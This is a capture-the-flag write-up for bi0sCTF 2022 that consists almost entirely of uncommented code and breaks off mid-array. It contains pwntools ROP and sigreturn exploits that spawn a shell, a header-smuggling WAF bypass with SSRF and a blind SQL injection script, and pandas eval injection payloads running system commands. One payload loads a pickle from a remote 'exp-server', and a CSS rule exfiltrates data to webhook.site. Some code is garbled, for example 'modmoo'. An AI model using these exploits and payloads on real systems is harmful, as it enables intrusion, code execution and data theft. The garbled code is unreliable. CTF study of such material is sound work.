# bi0sCTF2022 Writeup by r3kapig

> 原文: https://www.ctfiot.com/93593.html
> ID: 93593


```
from pwn import *

p = process('./notes')
    #p=remote('pwn.chall.bi0s.in',37981)
libc=ELF('./libc.so.6')
elf=ELF('./notes')
context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
def menu(ch):
    sla('Enter Choice: ',str(ch))
def add(id,name,size,cont):
    sl('1')
    sla('Enter Note ID: ',str(id))
    sa('Enter Note Name:',name)
    sla('Enter Note Size: ',str(size))
    sa('Enter Note Content: ',cont)
def delete(idx):
    menu(2)
    sla('Enter Note ID: ',str(idx))
def show(idx,name,cont):
    menu(3)
    sla('Enter Note ID: ',str(idx))
    sla('Note Name: ',name)
    sla('Enter Note Content: ', cont)
def edit(size,name):
    menu(4)
    sla('Enter Note Size: ',str(size))
    sla('Enter Name: ',name)
def encrypt(idx,cont):
    menu(5)
    sla('Enter Note ID: ',str(idx))
    sla('Enter Note Content: ',cont)

def decrypt(cont):
    return xor(cont, b"2111485077978050")
syscall=0x401bc2
poprdi=0x0000000000401bc0
poprbp=0x00000000004011ed
    #gdb.attach(p,'b* 0x401B7A')
add(0,'aaa',0x20,'x00'*8)
payload='x00'*0x48+p64(poprdi)+p64(0x3b)+p64(elf.sym['syscall'])+'x00'*0x330+'/bin/shx00'*4
encrypt(0,decrypt(payload))
sleep(6)
add(0,'aaa',0x20,'x00'*8)
sleep(2)
edit(len(payload),'x00'*8)
sleep(3)

p.interactive()
from pwn import *

p = process('./notes')
    #p=remote('pwn.chall.bi0s.in',37981)
libc=ELF('./libc.so.6')
elf=ELF('./notes')
context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
def menu(ch):
    sla('Enter Choice: ',str(ch))
def add(id,name,size,cont):
    sl('1')
    sla('Enter Note ID: ',str(id))
    sa('Enter Note Name:',name)
    sla('Enter Note Size: ',str(size))
    sa('Enter Note Content: ',cont)
def delete(idx):
    menu(2)
    sla('Enter Note ID: ',str(idx))
def show(idx,name,cont):
    menu(3)
    sla('Enter Note ID: ',str(idx))
    sla('Note Name: ',name)
    sla('Enter Note Content: ', cont)
def edit(size,name):
    menu(4)
    sla('Enter Note Size: ',str(size))
    sla('Enter Name: ',name)
def encrypt(idx,cont):
    menu(5)
    sla('Enter Note ID: ',str(idx))
    sla('Enter Note Content: ',cont)

def decrypt(cont):
    return xor(cont, b"2111485077978050")
syscall=0x401bc2
poprdi=0x0000000000401bc0
poprbp=0x00000000004011ed
gdb.attach(p,'b* 0x401B7A')
add(0,'aaa',0x20,'x00'*8)
bss= 0x404100
frame = SigreturnFrame(kernel='amd64')
frame.rip = 0x401bc2 # syscall;
frame.rax = 59 # RT_SIGRETURN
frame.rdi = bss # /bin/sh
frame.rsi = 0x404200 # NULL
frame.rdx = 0x404208 # NULL

payload = b"A" * 64 + p64(0) + p64(poprdi) + p64(bss) + p64(0x4013D6) + p64(poprdi) + p64(15) + p64(elf.plt['syscall']) + bytes(frame)
encrypt(0,decrypt(payload))
sleep(6)
add(0,'aaa',0x20,'x00'*8)
sleep(2)
edit(len(payload),'x00'*8)
sleep(3)
sla(b"Sent", b"/bin/shx00")
sl('/bin/shx00')
sl('/bin/shx00')
p.interactive()
package main

import (
        "fmt"
        "log"
        "net/http"
        "net/http/httputil"
        "net/url"
        "strings"
)
var invalid = [6]string{"'", """, ")", "(", ")","="}

func ProxyRequestHandler(proxy httputil.ReverseProxy) func(http.ResponseWriter, *http.Request) {
    return func(w http.ResponseWriter, r http.Request) {
                if(r.Header.Get("X-pro-hacker")!=""){
                     fmt.Fprintf(w, "Hello Hacker!n")
                     return
                }
                if(strings.Contains(r.Header.Get("flag"), "gimme")){
                    fmt.Fprintf(w, "No flag For you!n")
                    return
                }
                if(r.Header.Get("Token")!=""){
                    for _, x := range invalid {
                            if(strings.Contains(r.Header.Get("Token"), x)){
                                fmt.Fprintf(w, "Hello Hacker!n")
                                return  
                            }

                        }
                }
                
        proxy.ServeHTTP(w, r)
    }
}

func main() {
        url, err := url.Parse("http://app:
5000")
    if err != nil {
        fmt.Println(err)
    }
        proxy := httputil.NewSingleHostReverseProxy(url)

        http.HandleFunc("/", ProxyRequestHandler(proxy))
        http.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
                fmt.Fprintf(w, "Hello World!n")
})
        log.Fatal(http.ListenAndServe(":80", nil))
}
GET / HTTP/1.1
X_pro-hacker: Pro-hacker
flag: 
flag: gimme
GET / HTTP/1.1
X-pro-hacker: Pro-hacker
flag: ,gimme
def init_db():
    try: 
        conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),'users.db'))
        cursor = conn.cursor()
        result = cursor.executescript(f"""
            CREATE TABLE IF NOT EXISTS users  (
                                                    username  TEXT, 
                                                    token TEXT
                                                );
            CREATE TABLE IF NOT EXISTS flag  (
                                                flag_is_here  TEXT
                                            );                                                  
            Delete from users;
            Delete from flag;
            INSERT INTO users values ('user','some_randomtoken'),
                                    ('admi','some_randomtoken'),
                                    (
                                        'admin',
                                        '{FLAG}'
                                    );
            INSERT INTO flag values ('{FLAG}');
            """)
        conn.commit()
        return True
    
except:
        return False
def add_user(user,token):
    q = f"INSERT INTO users values ('{user}','{token}')"
    db_query(q)
    return
  
@app.route("/")
def index():
    while not init_db():
        continue
    if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag"):
        try:
            if request.headers.get("Token"):         
                token = request.headers.get("Token")
                token = token[:16]
                token = token.replace(" ","").replace('"',"")
                if request.form.get("user"):
                    user = request.form.get("user")
                    user = user[:38]
                    add_user(user,token)            
                query = f'SELECT * FROM users WHERE token="{token}"'
                res = db_query(query)
                res = res.fetchone()
                return res[1] if res and len(res[0])>0  else "INDEXn"
        
except Exception as e:
            print(e) 
    return "INDEXn"
query = f'SELECT * FROM users WHERE token="{token}"'
res = db_query(query)
res = res.fetchone()
return res[1] if res and len(res[0])>0  else "INDEXn"
Deny from all
//login.php
<?php
session_start();
if (!file_exists('uploads')) {
    mkdir('uploads');
}

if(isset($_POST['submit'])){
    if(isset($_POST['username'])){
        $_SESSION["username"] = $_POST["username"];
        $folder = './uploads/'.session_id()."/";
        if (!file_exists($folder)) {
          mkdir($folder);
        }  
        $_SESSION['folder'] = $folder;
        header("Location: /index.php");
        die();

    }else{
        echo "no username provided";
    }
}

?>
$FOLDER = $_SESSION['folder'];

//create new folder inside uploads using get parameter
if (isset($_GET['new'])) {
    if(check_name($_GET["new"])){
        $newfolder = $FOLDER.$_GET['new'];
        if (!file_exists($newfolder)) {
            
            mkdir($newfolder);
        }else{
            $error = "folder already exist";
        }
    }else{
        die('not allowed');
    }
}
check_name过滤了符号.与/，同时里面还调用了report函数
function check_name($filename){
    if(gettype($filename)==="string"){
        if(preg_match("/[./]/i",$filename)){
            report();
            return false;
        }else{
            return true; //safe
        }
    }
    else{
        return false;
    }
}

function report(){
    //report usename
    ini_set("from",$_SESSION['username']);
    file_get_contents('http://localhost/report.php');

}
if(isset($_POST["submit"])){
    if(isset($_FILES['file'])&& isset($_POST['path'])){
        if(!check_name($_POST["path"])){
            die("not allowed");
        }
        $file = $_FILES['file'];
        $fileName = $file['name'];
        $fileSize = $file['size'];
        $fileError = $file['error'];
        $fileExt = explode('.', $fileName);
        $fileActualExt = strtolower(end($fileExt));
        if($fileError === 0){
            if($fileSize < 100000){
                $name = uniqid('', true).".".$fileActualExt;
                $fileDestination = $FOLDER.$_POST['path'];
                upload($file['tmp_name'], $fileDestination,$name);
                header("Location: index.php?uploadsuccess");
            }else{
                $error =  "Your file is too big!";
            }
        }else{
            $error =  "There was an error uploading your file!";
        }
        
    }else{
        $error =  "parameter missing";
    }
}
$FOLDER = $_SESSION['folder'];
$dirr = ['.','..'];
if(isset($_GET['fol'])){
    
    //echo $FOLDER.$_GET['fol'];
    if(check_name($_GET['fol']) && is_dir($FOLDER.$_GET['fol'])){
        $c = "";
        $files = array_diff(scandir($FOLDER.$_GET['fol']),$dirr);
        foreach ($files as $f) {
            
            $c.= "<li class="list-group-item"><a href='/view.php?file=".$_GET['fol']."/".$f."'>$f</a></li>";

        }
        echo str_replace("CONTENT",$c,$files_template);
    }else{
        echo 'folder not found';
    }
}
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $ext = explode('.', $file);
    $type = substr(strtolower(end($ext)),0,3);
    $file = $FOLDER."/".$file;
    if($type==="txt"){
        try {
            if(file_exists($file)){
                chdir($FOLDER);
                echo file_get_contents($_GET['file']);
            }else{
                echo 'File not found!';
            }
        } catch (Throwable $th) {
           echo 'Some error Occured';
        }
        
    }
    else if($type==="png" || $type==="jpg"){

        try {
            if(file_exists($file)){
                chdir($FOLDER);
                echo "";
            }else{
                echo 'File not found!';
            }
        } catch (Throwable $th) {
            echo 'Some error Occured';
        }
        
    }
    else{
        echo 'Invaild type';
    }

}
function report(){
    //report usename
    ini_set("from",$_SESSION['username']);
    file_get_contents('http://localhost/report.php');

}
<?php

/**
 * Author: Y4tacker
 */
function report($username){
    ini_set("from",$username);
    file_get_contents('http://ip:
1234/report.php');

}

if(isset($_POST['name'])){
    report($_POST['name']);
};
import io
import re
import requests

flag = ''
base_url = 'http://web.chall.bi0s.in:
8000'
flag_chars = 'abcdef0123456789'
hijack_tpl = 'rn'.join([
    'anything',                  # could be anything(including '')
    'X_pro-hacker: Pro-hacker',  # bypass waf, flask will replace underscore with dash
    'flag: bypass-waf',          # the waf only takes the first flag in HTTP header
    'flag: gimme',               # but flask puts headers with the same name into a array
    'Host: just-need-this-header',
    'Content-Type:
application/x-www-form-urlencoded',
    'Token: {}',
    'Content-Length: {}',        # with Content-Length set to len(payload)
    '',                          # and 2 CRLFs marking the end of header
    '{}',                        # to control the HTTP body
])

for i in range(9):  # from the challenge description we know len(flag) == 9
    for token in flag_chars:
        with requests.Session() as s:
            sqli = f"user=a',substr((select * from flag),{i + 1},1))-- "
            username = hijack_tpl.format(token, len(sqli), sqli)

            # login
            s.post(f"{base_url}/login.php",
                   data={'username': username, 'submit': ''})

            # create folder
            s.get(f'{base_url}/index.php?new=http:')

            # upload txt
            s.post(f'{base_url}/index.php',
                   data={'path': 'http:', 'submit': ''},
                   files={'file': ('.txt@waf', io.BytesIO())})  # an empty file-like object is ok

            # get txt file name
            txt = re.search(r"@waf'>(?P<txt>[^<]*)",
                            s.get(f"{base_url}/view.php?fol=http:").text).group('txt')

            # ssrf -> bypass waf -> blind sqli, fol=. or fol=/
            if 'INDEX' not in s.get(f"{base_url}/view.php?fol=.&file=http://{txt}").text:
                flag += token
                print(f"bi0sctf{{{flag}}}", end='r')
                break

print()
ocation /static {
    alias /static/;
}
#!/usr/bin/python3

from server import Server
import pandas as pd

try:
    df = pd.read_csv("../database/currency-rates.csv")
    server = Server()
    server.set_header("Content-Type", "text/html")
    params = server.get_params()
    assert "currency_name" in params
    currency_code = params["currency_name"]
    results = df.query(f"currency == '{currency_code}'")
    server.add_body(results.to_html())
    server.send_response()
except Exception as e:
    print("Content-Type: text/html")
    print()
    print("Exception")
    print(str(e))
from os import environ

class Server:
    def __init__(self):
        self.response_headers = {}
        self.response_body = ""
        self.post_body = ""
        self.request_method = self.get_var("REQUEST_METHOD")
        self.content_length = 0

    def get_params(self):
        request_uri = self.get_var("REQUEST_URI") if  self.get_var("REQUEST_URI") else ""
        params_dict = {}
        if "?" in request_uri:
            params = request_uri.split("?")[1]
            if "&" in params:
                params = params.split("&")
                for param in params:
                    params_dict[param.split("=")[0]] = param.split("=")[1]
            else:
                params_dict[params.split("=")[0]] = params.split("=")[1]
        return params_dict

    def get_var(self, variable):
        return environ.get(variable)

    def set_header(self, header, value):
        self.response_headers[header] = value

    def add_body(self, value):
        self.response_body += value

    def send_file(self, filename):
        self.response_body += open(filename, "r").read()

    def send_response(self):
        for header in self.response_headers:
            print(f"{header}: {self.response_headers[header]}n")

        print("n")
        print(self.response_body)
        print("n")
'+@pd.eval('__import__("os").system("ls /")','python','python',True,@pd.__builtins__)+'

a'+(@server.__class__.__init__.__globals__['__spec__'].loader.__init__.__globals__['sys'].modules['os'].popen('ls /').read())
#

'and@'pd'.annotations.__class__.__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls > /tmp/test")') or '

'+(@pd.io.common.os.popen('ls > /tmp/ls').read())+'

'|@pd.read_pickle('http://exp-server/output.exploit')|'

'or[].__class__.__base__.__subclasses__()[145].__init__([].__class__.__base__.__subclasses__()[145]).__class__.__name__<'1'or@server.add_body([].__class__.__base__.__subclasses__()[145]._module.sys.modules["subprocess"].check_output(["ls","-l", "/"]).decode()).__class__.__name__<'

'+@__builtins__.exec('importx20os;raisex20Exception(os.listdir("/"))')+'
this.setState((prevState) => {
    let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${
        window.location.hash.replace("#", '')
    }-mode.css`;
    prevState.link_obj.href = href;
    return {}
});
span[aria-label="1"]:
empty {
  background-image: url("https://webhook.site/0b13d0cd-8f43-472c-98ac-de23aba8b2c2/?img=1");
}
/* multiple repeated items... */
key = [
    0x52, 0xFD, 0xFC, 0x07, 0x21, 0x82, 0x65, 0x4F, 0x16, 0x3F, 
    0x5F, 0x0F, 0x9A, 0x62, 0x1D, 0x72, 0x95, 0x66, 0xC7, 0x4D, 
    0x10, 0x03, 0x7C, 0x4D, 0x7B, 0xBB, 0x04, 0x07, 0xD1, 0xE2, 
    0xC6, 0x49
]

iv = [
    0x81, 0x85, 0x5A, 0xD8, 0x68, 0x1D, 0x0D, 0x86, 0xD1, 0xE9, 
    0x1E, 0x00, 0x16, 0x79, 0x39, 0xCB
]

cipherText = []

from PIL import Image

image = Image.open('enc.png')

for i in range(100):
    r, g, b, a = image.getpixel((i, 99))
    if a != 0:
        cipherText.append(r)

for i in range(len(cipherText)):
    cipherText[i] ^= i

from Crypto.Cipher import AES

cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))

plainText = cipher.decrypt(bytes(cipherText))
print (plainText)
cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))

plainText = cipher.decrypt(plainText[:-16])
print (plainText)
[heap]:
000055BA5DF3C000 sub_55BA5DF3C000 proc near
[heap]:
000055BA5DF3C000 mov     rax, 11111111h
[heap]:
000055BA5DF3C007 mov     rcx, 0FFFFFFFF93A3F3CDh
[heap]:
000055BA5DF3C00E sub     rax, rcx
[heap]:
000055BA5DF3C011 mov     rcx, 22222222h
[heap]:
000055BA5DF3C018 add     rax, rcx
[heap]:
000055BA5DF3C01B mov     rcx, 1337BEEFh
[heap]:
000055BA5DF3C022 xor     rax, rcx
[heap]:
000055BA5DF3C025 mov     rcx, 33AEF5CBh
[heap]:
000055BA5DF3C02C sub     rax, rcx
[heap]:
000055BA5DF3C02F mov     rcx, 33333333h
[heap]:
000055BA5DF3C036 add     rax, rcx
[heap]:
000055BA5DF3C039 mov     rcx, 44444444h
[heap]:
000055BA5DF3C040 mov     rdx, 55555555h
[heap]:
000055BA5DF3C047 mov     rbx, rax
[heap]:
000055BA5DF3C04A xor     rax, rdx
[heap]:
000055BA5DF3C04D xor     rbx, rcx
[heap]:
000055BA5DF3C050 mov     rdx, 550D68CEh
[heap]:
000055BA5DF3C057 sub     rax, rdx
[heap]:
000055BA5DF3C05A mov     rdx, 5F9751EBh
[heap]:
000055BA5DF3C061 sub     rbx, rdx
[heap]:
000055BA5DF3C064 add     rax, rbx
[heap]:
000055BA5DF3C067 mov     rcx, 66666666h
[heap]:
000055BA5DF3C06E mov     rdx, 77777777h
[heap]:
000055BA5DF3C075 add     rcx, rax
[heap]:
000055BA5DF3C078 add     rdx, rax
[heap]:
000055BA5DF3C07B mov     rax, 0FFFFFFFF88888888h
[heap]:
000055BA5DF3C082 xor     rdx, rax
[heap]:
000055BA5DF3C085 xor     rcx, rax
[heap]:
000055BA5DF3C088 mov     rax, 4AA34A4h
[heap]:
000055BA5DF3C08F mov     rbx, 2C786553h
[heap]:
000055BA5DF3C096 sub     rbx, rdx
[heap]:
000055BA5DF3C099 sub     rax, rcx
[heap]:
000055BA5DF3C09C add     rax, rbx
[heap]:
000055BA5DF3C09F mov     rcx, 33333333h
[heap]:
000055BA5DF3C0A6 add     rax, rcx
[heap]:
000055BA5DF3C0A9 mov     rcx, 44444444h
[heap]:
000055BA5DF3C0B0 mov     rdx, 55555555h
[heap]:
000055BA5DF3C0B7 xor     rax, rdx
[heap]:
000055BA5DF3C0BA xor     rax, rcx
[heap]:
000055BA5DF3C0BD mov     rbx, 74180051h
[heap]:
000055BA5DF3C0C4 sub     rax, rbx
[heap]:
000055BA5DF3C0C7 mov     rcx, 66666666h
[heap]:
000055BA5DF3C0CE add     rax, rcx
[heap]:
000055BA5DF3C0D1 mov     rcx, 77777777h
[heap]:
000055BA5DF3C0D8 mov     rdx, 0FFFFFFFF88888888h
[heap]:
000055BA5DF3C0DF xor     rax, rdx
[heap]:
000055BA5DF3C0E2 xor     rax, rcx
[heap]:
000055BA5DF3C0E5 mov     rbx, 3E07994Ch
[heap]:
000055BA5DF3C0EC sub     rax, rbx
[heap]:
000055BA5DF3C0EF retn
[heap]:
000055BA5DF3C0EF
[heap]:
000055BA5DF3C0EF sub_55BA5DF3C000 endp
from gmssl.sm4 import CryptSM4, SM4_DECRYPT
import z3

i = [z3.BitVec(f'i{_}', 64) for _ in range(8)]
solver = z3.Solver()
solver.add(i[0] - 0x93A3F3CD == 0)
solver.add((i[1] ^ 0x1337BEEF) - 0x33AEF5CB == 0)
solver.add((i[2] ^ i[4]) - 0x550D68CE == 0)
solver.add((i[2] ^ i[3]) - 0x5F9751EB == 0)
solver.add(0x2C786553 - (i[6] ^ i[7]) == 0)
solver.add(0x04AA34A4 - (i[5] ^ i[7]) == 0)
solver.add((i[2] ^ i[3] ^ i[4]) - 0x74180051 == 0)
solver.add((i[5] ^ i[6] ^ i[7]) - 0x3E07994C == 0)

if solver.check() == z3.sat:
    m = solver.model()
    e = ''.join(hex(m[i[_]].as_long()).replace("0x", "") for _ in range(8))
    print(e)
    e = bytes.fromhex(e)
    sm4 = CryptSM4()
    sm4.set_key(bytes.fromhex("554248506A424B6C73513254754E536B"), SM4_DECRYPT)
    print(sm4.crypt_cbc(bytes.fromhex('3779304D3639545153636D376D665876'), e))
opcode = [
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E,
    0x35, 3, 0x3E, 
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    0x35, 3, 0x35, 3, 0x3E, 
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    0x35, 3, 0x35, 3, 0x3E, 
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    
    0x30, 0, 3, 0x31, 0, 3, 0x3D, 3, 
    0x30, 0, 3, 0x31, 0, 3, 0x3D, 3, 
    0x30, 0, 3, 0x30, 0, 3, 0x3D, 3, 
    0x30, 0, 3, 0x30, 0, 3, 0x31, 0, 3, 0x3D, 3,
     
    0x3E, 0x36, 0, 3, 0x36, 0, 3, 0x36, 0, 3, 0x36, 0, 3, 0x40
]
# 0x35, 0, 0x35, 3, 0x3E, 
v13 = f1
v13 *= v13
v13 *= 4
stack.append(v13) # f1 * f1 * 4

# 0x35, 3, 0x35, 3, 0x3E, 
v13 = stack[1]
v13 *= f2
v13 *= 5
stack.append(v13) # f1 * f2 * 5 

# 0x35, 3, 0x3E,
v13 = stack[2]
v13 *= 105
stack.append(v13) # f1 * 105

# 0x35, 3, 0x3E, 
v13 = stack[3]
v13 *= 6
stack.append(v13) # f2 * 6

# 0x35, 0, 0x35, 3, 0x3E, 
v13 = stack[4]
v13 *= v13
v13 *= 2
stack.append(v13) # f1 * f1 * 2

# 0x35, 3, 0x3E, 
v13 = stack[5]
v13 *= 13
stack.append(v13) # f2 * 13

# 0x35, 3, 0x3E, 
v13 = stack[6]
v13 *= 17
stack.append(v13) # f1 * 17

# 0x35, 3, 0x35, 3, 0x3E, 
v13 = stack[7]
v13 *= f3
v13 *= 5
stack.append(v13) # f2 * f3 * 5

# 0x35, 0, 0x35, 3, 0x3E,
v13 = stack[8]
v13 *= v13
v13 *= 5
stack.append(v13) # f2 * f2 * 5

# 0x35, 3, 0x3E, 
v13 = stack[9]
v13 *= 105
stack.append(v13) # f3 * 105

# 0x35, 3, 0x35, 3, 0x3E, 
v13 = stack[10]
v13 *= f3
v13 *= 4
stack.append(v13) # f4 * f3 * 4

# 0x35, 0, 0x35, 3, 0x3E, 
v13 = stack[11]
v13 *= v13
v13 *= 5
stack.append(v13) # f3 * f3 * 5

# 0x35, 3, 0x3E, 
v13 = stack[12]
v13 *= 303
stack.append(v13) # f4 * 303
v13 = stack[13]
rax = stack.pop()
rbx = stack.pop()
stack.append(rax + rbx)
# f4 * 303 + f3 * f3 * 5
rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)
# f4 * 303 + f3 * f3 * 5 - f4 * f3 * 4
res = []
res.append(stack.pop() % dword_5220)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax + rbx)
# f3 * 105 + f2 * f2 * 5
rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)
# f3 * 105 + f2 * f2 * 5 - f2 * f3 * 5
res = []
res.append(stack.pop() % dword_5220)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)
# f1 * 17 - f2 * 13 - f1 * f1 * 2
res = []
res.append(stack.pop() % dword_5220)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax + rbx)
# f2 * 6 - f1 * 105 - f1 * f2 * 5 + f1 * f1 * 4
res = []
res.append(stack.pop() % dword_5220)
((f4 * 303 + f3 * f3 * 5 - f4 * f3 * 4) ) % mask == 0x11226D6A
((f3 * 105 + f2 * f2 * 5 - f2 * f3 * 5) ) % mask == 0x68E54823
((f1 * 17 + f2 * 13 + f1 * f1 * 2) ) % mask == 0x34CC1889
((f2 * 6 + f1 * 105 + f1 * f2 * 5 - f1 * f1 * 4) ) % mask == 0x1EF6E9EB
    #include 
using namespace std;
using ll = long long;

int power(int a, int k, int mod) {
  int ret = 1;
  for (; k; k >>= 1, a = 1ll * a * a % mod) if (k&1) ret = 1ll * ret * a % mod;
  return ret;
}

int main() {
  int mod = 0x7EFF4B91;
  int res0 = 0x11226D6A;
  int res1 = 0x68E54823;
  int res2 = 0x34CC1889;
  int res3 = 0x1EF6E9EB;
  int inv13 = power(13, mod - 2, mod);
  
  for (ll f1 = 0; f1 < INT_MAX; ++f1) {
    ll f2 = ((res2 - f1 * 17 - f1 * f1 % mod * 2) % mod * inv13) % mod;
    if (((f2 * 6 + f1 * 105 + f1 * f2 % mod * 5 - f1 * f1 % mod * 4) % mod + mod) % mod == res3) {
      f2 = (f2 + mod) % modmoo;
      unsigned long long tf1 = f1, tf2 = f2;
      if ((tf1 * 17 + tf2 * 13 + tf1 * tf1 * 2) % mod != res2) continue;
      if (((tf2 * 6 + tf1 * 105 + tf1 * tf2 * 5 - tf1 * tf1 * 4) % mod + mod) % mod != res3) continue;
      ll x = ((res1 - f2 * f2 % mod * 5) % mod + mod) % mod;
      ll y = ((105 - f2 * 5) % mod + mod) % mod;
      y = power(y, mod-2, mod);
      ll f3 = (x * y % mod + mod) % mod;
      x = (res0 - f3 * f3 % mod * 5) % mod;
      y = (303 - f3 * 4) % mod;
      y = power(y, mod-2, mod);
      ll f4 = (x * y % mod + mod) % mod;
      unsigned long long tf3 = f3, tf4 = f4;
      if (((tf4 * 303 + tf3 * tf3 * 5 - tf4 * tf3 * 4) % mod + mod) % mod != res0) continue;
      if (((tf3 * 105 + tf2 * tf2 * 5 - tf2 * tf3 * 5) % mod + mod) % mod != res1) continue;
      printf("%lld %lld %lld %lldn", f1, f2, f3, f4);
    }
  }
  return 0;
}
>>> import libnum
>>> b"bi0sCTF{"+libnum.n2s(1953066341)+libnum.n2s(1818325107)+libnum.n2s(1768843103)+libnum.n2s(1785295997)
b'bi0sCTF{timelapsing_jit}'
from sage.all import *
import itertools
def small_roots(f, bounds, m=1, d=None):
    
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()
    
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m+1):
        base = N**(m-i) * f**i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1/factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B*monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots

    return []

p = 115792089210356248762697446949407573529996955224135760342422259061068512044369
from hashlib import sha256
z0, r0, s0, k0upper = (7496648251275913379321762834259461106413066198251568863972241549518064825045, 35708720267216780141386972017638777589648610471064977388051210664743651182375, 9662179038519615060061698799209221467470247302473971588084625796487341336154, 95052095029311712302690948913953984379788450191371396826510415254434210643968)
# (30338807469659243526067570717263914107109404131145581381962141065570542682259, 43851411654896912189138312109624484265004182982926637890370600465748239140223, 106481291664766764647716317252159351590989262652905730138893713822745324775435, 81230974975392412240328835818144420434492415594227637683334578249558160048128)
z1, r1, s1 ,k1upper = (111835103479967511801273161109097060425429270142914837192258803061862468767340, 58501386591257759132453271402849092080165690028881563872587436596762908386517, 25627184742160112142369942661671203533076276538669251446198338686442020839709, 9183002560293761939923713800050215778090209618706208942684718339054572142592)
# (51244276794475006764734096639881124571891948637729294101379411867362632631294, 36750292731574219885284236746359615855307648761830525593472443690459194965250, 88055573187005285998775508217321157018762308369537667398558614085325414799653, 4650611669265657333998771183266096645438495825074800915291751302057284337664)
PR.<k0lower,k1lower> = PolynomialRing(Zmod(p))

f = r1*s0*(k0upper+k0lower) - r0*s1*(k1upper+k1lower) - (z0*r1 - z1*r0)
k0lower,k1lower = small_roots(f,[2^128,2^128],m=3,d=4)[0]
from Crypto.Util.number import *

public = [1]
for i in range(2, 91):
    public.append(public[-1]*i)
q = sum(public)
public = public[::-1]
r = 439336960671443073145803863477
ct =  [(85, 2009755672435753240933297922620729942110285100089234834611189610638944428122270966606450209287004686147490741726074233399923807772025455384), (87, 4996607263053501712119670315411210635641476911112656716346186101581162098939506206462698692878856867719374177604968008598982986859155008123), (87, 4837953870616520482139098354277306810171956043791834010204071803405678054968703256907153189059041329376000508442178425613919361101370091597), (87, 2933251583165904105425041103443198171501175581919361545836839336222902826332690613281372817019459906816365925875888304559050438360535693754), (87, 3687643521316276110350069295074808763624177150637370283489602776297956670406673088896906135313859622547057266461156951352840606158133939326), (85, 1338269001646504891852362627714857562957599731250242281507737655117481275381522940187354460968741738873145343823622277547003496172474140929), (88, 7933296831307546148859657742504382496951023270916400508699917815337497611045057441275885597739792345698682705664067022591023419704320903682), (88, 5551940689407978486506000896917506389553250109195458521661213619690861850998613004330276887098156130761269810440548744569924180624922795113), (84, 4231118499738387243085586897653540321361890016337481573279774741827125072054069869204040621495890626440611926639348835434382399384680055422), (85, 4704615409370307656606356674605132679559694819773906599372238093928995241862651680281288235856744305731307534075261385839804274777809615349), (88, 8080256207998531514821351856269697662773084407605094205301308544428843939544685672982309353297946702140050231399104513874885470725033197665), (88, 5409126049900711181553897969759692389994841569000620092514718715454021797905578507700126871105210241868943216288008246115824215988452628610), (87, 9252119153621946581189075112355267174890952393437560488066048810424246555795717704306898381332924931192879341998003358581626937969846419514), (88, 4309485343027874993328683769447337855319861832898927390313412221773647599911173732334028315977555272520439642698050646195173212678056296824), (87, 7585821393024154059281324167310518147335428246416250953866063679865301977430635054486170591035445789330984486529581273451159109931487791502), (87, 4266559781861060657731014334455291598689251074723949797856286897802219958857948301662899795696748957745131495362941575798432727634477829169), (85, 2641970821454174926450206596995181582610648509828849026215891906920020076919398240347027542452996819530972432115175678566086129470049375389), (86, 3077438307667140950446795937461054813957511252383671895612002141778156796698300700433893422617209993376314581927862590976739430303756825799), (84, 6606999799754153651147831000154190219518207430742825676139927743071667153908159445512098245423654757585044526053832363134210629951000894424), (88, 5670578370066772514741437284311647297873639929831922637574590430528630079731096253156055423807240883352926044290617794045498770071653673648), (87, 6894132144232319468740512750496837680809983881874187255032194645685827169634783788480774942267705885439820208999500465383743432841886297780), (88, 6348559834296411797469331328911826454137045759724408730535584371919321718963812479226912064993936288733920150791627489465935504738729746712), (87, 